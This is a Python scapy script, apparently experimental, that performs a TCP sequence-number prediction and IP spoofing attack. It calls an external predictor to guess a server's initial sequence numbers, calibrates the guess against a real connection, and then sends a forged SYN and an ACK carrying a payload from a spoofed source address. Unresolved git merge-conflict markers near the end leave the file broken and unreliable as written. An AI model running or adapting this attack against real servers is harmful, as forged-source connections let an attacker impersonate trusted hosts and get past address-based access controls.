#!/usr/local/bin/python

import sys
from scapy.all import *
from time import sleep
import subprocess


print("Hello!\n")
print(sys.version)
#initialize command line arguments (TODO: need to sanitize input and automate ip grab)
local_ip = sys.argv[1]
local_port = sys.argv[2]
remote_ip = sys.argv[3]
remote_port = sys.argv[4]
spoof_ip = sys.argv[5]
spoof_port = sys.argv[6]
seq_create = sys.argv[7]

#determine sequence numbers ahead-of-time to reduce delay before spoof
#local_ip here is dest_ip for server
seq_num_output_current = subprocess.check_output([seq_create, remote_ip, remote_port, local_ip, local_port])

seq_num_output_spoof = subprocess.check_output([seq_create, remote_ip, remote_port, spoof_ip, spoof_port])

print(seq_num_output_current)
print(seq_num_output_spoof)

#create connection to server and record sequence number
outbound_ip = IP(src=local_ip, dst=remote_ip)
outbound_tcp = TCP(sport=int(local_port), dport=int(remote_port), flags="S")
packet = outbound_ip/outbound_tcp
response = sr1(packet)
response_seq_num = int(response[TCP].seq)

#calculate new sequence number for spoofed connection based on difference with current one
seq_num_output_current = int(seq_num_output_current)
seq_num_output_spoof = int(seq_num_output_spoof)
spoof_seq = seq_num_output_spoof + (response_seq_num - seq_num_output_current)


#create spoofed connection
outbound_ip = IP(src=spoof_ip, dst=remote_ip)
outbound_tcp = TCP(sport=int(spoof_port), dport=int(remote_port), flags="S")
packet = outbound_ip/outbound_tcp
send(packet)
#sleep(.0001)
outbound_tcp_ack = TCP(sport=int(spoof_port), dport=int(remote_port), flags="A", seq=1, ack=(spoof_seq+1))
packet = outbound_ip/outbound_tcp_ack/"Boosh!"
send(packet)




<<<<<<< HEAD
=======
leg_outbound_ip = IP(src=local_ip, dst=remote_ip)
#leg_outbound_tcp = TCP(sport=int(local_port), dport=int(remote_port))
leg_outbound_tcp = TCP(dport=int(remote_port))
packet = leg_outbound_ip/leg_outbound_tcp/'Hello\n'
response, non_response = sr1(packet)
print(response.summary())
>>>>>>> ab95893d794015d31744ac41c8172ca4eb68cc36


#calculate time from sequence number

#spoof!

